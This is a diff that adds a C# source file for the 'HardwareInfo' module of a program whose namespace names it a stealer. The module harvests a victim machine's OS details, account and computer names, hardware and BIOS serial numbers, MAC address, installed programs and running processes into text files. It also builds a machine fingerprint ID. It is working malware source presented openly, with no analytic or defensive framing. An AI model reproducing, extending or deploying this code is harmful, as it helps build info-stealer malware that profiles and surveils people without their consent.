@@ -1,0 +1,349 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Management;
+using System.Windows.Forms;
+
+namespace Stealer.modules
+{
+  internal class HardwareInfo
+  {
+    public static void GoInfo()
+    {
+      string path = Program.path + "\\HardwareInfo\\";
+      if (!File.Exists(path))
+        Directory.CreateDirectory(path);
+      using (StreamWriter streamWriter = new StreamWriter(path + "SystemInfo.txt", true))
+      {
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nOSInformation: " + HardwareInfo.GetOSInformation());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nComputerName: " + HardwareInfo.GetComputerName());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nAccountName: " + HardwareInfo.GetAccountName());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nVideoController: " + HardwareInfo.GetVideoController());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nRAM: " + HardwareInfo.RAM() + ", noslots - " + HardwareInfo.GetNoRamSlots());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nProcessor: " + HardwareInfo.GetProcessor());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nMotherBoard: " + HardwareInfo.GetMotherBoard());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nScreenResolution: " + HardwareInfo.ScreenResolution());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nTimeZone: " + HardwareInfo.GetTimeZone());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nHDDSerialNo: " + HardwareInfo.GetHDDSerialNo());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nMACAddress: " + HardwareInfo.GetMACAddress());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nCdRomDrive: " + HardwareInfo.GetCdRomDrive());
+        streamWriter.WriteLine("\n[SYSTEMINFO]\nGetBIOS: Smaker - " + HardwareInfo.GetBIOSmaker() + ", sserno - " + HardwareInfo.GetBIOSserNo() + ", scaption - " + HardwareInfo.GetBIOScaption());
+      }
+      using (StreamWriter streamWriter = new StreamWriter(path + "InstallPrograms.txt", true))
+        streamWriter.WriteLine(HardwareInfo.GetPrograms());
+      using (StreamWriter streamWriter = new StreamWriter(path + "RunningProcess.txt", true))
+        streamWriter.WriteLine(HardwareInfo.GetProcess());
+    }
+
+    private static string GetVideoController()
+    {
+      List<string[]> strArrayList = new List<string[]>();
+      string empty1 = string.Empty;
+      string empty2 = string.Empty;
+      string str1 = "";
+      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass("Win32_VideoController").GetInstances().GetEnumerator())
+      {
+        try
+        {
+          if (enumerator.MoveNext())
+          {
+            string str2 = enumerator.Current.Properties["AdapterRAM"].Value.ToString();
+            str1 = "Name - " + enumerator.Current.Properties["Name"].Value.ToString() + ", memory - " + HardwareInfo.Counting(Convert.ToUInt64(str2));
+          }
+        }
+        catch
+        {
+        }
+      }
+      return str1;
+    }
+
+    private static string RAM()
+    {
+      string str = string.Empty;
+      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory").Get())
+      {
+        if (managementBaseObject.Properties["Capacity"].Value is ulong)
+          str = "Memory - " + HardwareInfo.Counting((ulong) managementBaseObject.Properties["Capacity"].Value);
+      }
+      return str;
+    }
+
+    private static string GetProcessor()
+    {
+      ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
+      string empty1 = string.Empty;
+      string empty2 = string.Empty;
+      string empty3 = string.Empty;
+      string empty4 = string.Empty;
+      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
+      {
+        if (enumerator.MoveNext())
+        {
+          empty1 = enumerator.Current.Properties["processorID"].Value.ToString();
+          empty2 = enumerator.Current.Properties["Name"].Value.ToString();
+          empty3 = enumerator.Current.Properties["NumberOfCores"].Value.ToString();
+          empty4 = enumerator.Current.Properties["Manufacturer"].Value.ToString();
+        }
+      }
+      return "Name - " + empty2 + ", id - " + empty1 + ", kerls - " + empty3 + ", manufacturer - " + empty4;
+    }
+
+    private static string GetPrograms()
+    {
+      string str = string.Empty;
+      if (Environment.Is64BitOperatingSystem)
+      {
+        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+        foreach (string subKeyName in registryKey1.GetSubKeyNames())
+        {
+          try
+          {
+            RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName);
+            if (registryKey2.GetValue("DisplayName").ToString() != "")
+              str = str + "\n[PROGRAMS]\n" + registryKey2.GetValue("DisplayName").ToString() + ", " + registryKey2.GetValue("InstallLocation").ToString() + "\n";
+            else
+              break;
+          }
+          catch
+          {
+          }
+        }
+        return str;
+      }
+      RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+      foreach (string subKeyName in registryKey3.GetSubKeyNames())
+      {
+        try
+        {
+          RegistryKey registryKey1 = registryKey3.OpenSubKey(subKeyName);
+          if (registryKey1.GetValue("DisplayName").ToString() != "")
+            str = str + "\n[PROGRAMS]\n" + registryKey1.GetValue("DisplayName").ToString() + registryKey1.GetValue("InstallLocation").ToString() + "\n";
+          else
+            break;
+        }
+        catch
+        {
+        }
+      }
+      return str;
+    }
+
+    private static string GetHDDSerialNo()
+    {
+      ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
+      string str = "";
+      foreach (ManagementObject managementObject in instances)
+        str += Convert.ToString(managementObject["VolumeSerialNumber"]);
+      return str;
+    }
+
+    private static string GetMACAddress()
+    {
+      ManagementObjectCollection instances = new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
+      string empty = string.Empty;
+      foreach (ManagementObject managementObject in instances)
+      {
+        if (empty == string.Empty && (bool) managementObject["IPEnabled"])
+          empty = managementObject["MacAddress"].ToString();
+        managementObject.Dispose();
+      }
+      return empty;
+    }
+
+    private static string GetCdRomDrive()
+    {
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_CDROMDrive").Get())
+      {
+        try
+        {
+          return managementObject.GetPropertyValue("Drive").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return "CD ROM Drive Letter: Unknown";
+    }
+
+    private static string GetBIOSmaker()
+    {
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
+      {
+        try
+        {
+          return managementObject.GetPropertyValue("Manufacturer").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return "BIOS Maker: Unknown";
+    }
+
+    private static string GetBIOSserNo()
+    {
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
+      {
+        try
+        {
+          return managementObject.GetPropertyValue("SerialNumber").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return "BIOS Serial Number: Unknown";
+    }
+
+    private static string GetBIOScaption()
+    {
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
+      {
+        try
+        {
+          return managementObject.GetPropertyValue("Caption").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return "BIOS Caption: Unknown";
+    }
+
+    public static string GetAccountName()
+    {
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_UserAccount").Get())
+      {
+        try
+        {
+          return managementObject.GetPropertyValue("Name").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return "Unknown";
+    }
+
+    private static string GetNoRamSlots()
+    {
+      int num = 0;
+      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(new ManagementScope(), new ObjectQuery("SELECT MemoryDevices FROM Win32_PhysicalMemoryArray")).Get())
+        num = Convert.ToInt32(managementBaseObject["MemoryDevices"]);
+      return num.ToString();
+    }
+
+    private static string GetOSInformation()
+    {
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
+      {
+        try
+        {
+          return ((string) managementObject["Caption"]).Trim() + ", " + (string) managementObject["Version"] + ", " + (string) managementObject["OSArchitecture"];
+        }
+        catch
+        {
+        }
+      }
+      return "BIOS Maker: Unknown";
+    }
+
+    public static string GetComputerName()
+    {
+      ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
+      string empty = string.Empty;
+      foreach (ManagementBaseObject managementBaseObject in instances)
+        empty = (string) managementBaseObject["Name"];
+      return empty;
+    }
+
+    private static string Counting(ulong number)
+    {
+      return number < 1073741824UL ? (number % 1048576UL == 0UL ? (number / 1048576UL).ToString() + " MB" : Math.Round((double) (number / 1048576UL), 1).ToString() + " MB") : (number % 1073741824UL == 0UL ? (number / 1073741824UL).ToString() + " GB" : Math.Round((double) (number / 1073741824UL), 1).ToString() + " GB");
+    }
+
+    private static string GetProcess()
+    {
+      string str = string.Empty;
+      foreach (Process process in Process.GetProcesses())
+        str = str + "\n[PROCESSES]\nId: " + process.Id.ToString() + ", name: " + process.ProcessName + "\n";
+      return str;
+    }
+
+    private static string ScreenResolution()
+    {
+      string empty = string.Empty;
+      Size size = Screen.PrimaryScreen.Bounds.Size;
+      return size.Width.ToString() + " x " + size.Height.ToString();
+    }
+
+    private static string GetTimeZone()
+    {
+      return TimeZoneInfo.Local.DisplayName;
+    }
+
+    private static string GetMotherBoard()
+    {
+      string str = string.Empty;
+      foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM CIM_Card").Get())
+      {
+        try
+        {
+          str = "Manufacturer - " + managementObject.GetPropertyValue("Manufacturer").ToString() + ", product - " + managementObject.GetPropertyValue("Product").ToString() + ", serialnumber - " + managementObject.GetPropertyValue("SerialNumber").ToString() + ", version - " + managementObject.GetPropertyValue("Version").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return str;
+    }
+
+    private static string GenerateMachineId()
+    {
+      string str1 = string.Empty;
+      try
+      {
+        foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM CIM_Card").Get())
+          str1 = str1 + managementObject["SerialNumber"].ToString() + "-";
+      }
+      catch
+      {
+      }
+      try
+      {
+        ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
+        managementObject.Get();
+        str1 = str1 + managementObject["VolumeSerialNumber"].ToString() + "-";
+      }
+      catch
+      {
+      }
+      try
+      {
+        string str2 = "ABCDE1431252346547FGHI154689JKLMNOPQRSTUVWX41478o3572348956347890672347681735243656YZ012345214546805311423o85465265113577899242354356789";
+        char[] chArray = new char[8];
+        Random random = new Random();
+        for (int index = 0; index < chArray.Length; ++index)
+          chArray[index] = str2[random.Next(str2.Length)];
+        string str3 = new string(chArray);
+        str1 = str1 + str3 + "-";
+      }
+      catch
+      {
+      }
+      try
+      {
+        foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
+          str1 += managementObject["ProcessorId"].ToString();
+      }
+      catch
+      {
+      }
+      return str1;
+    }
+  }
+}
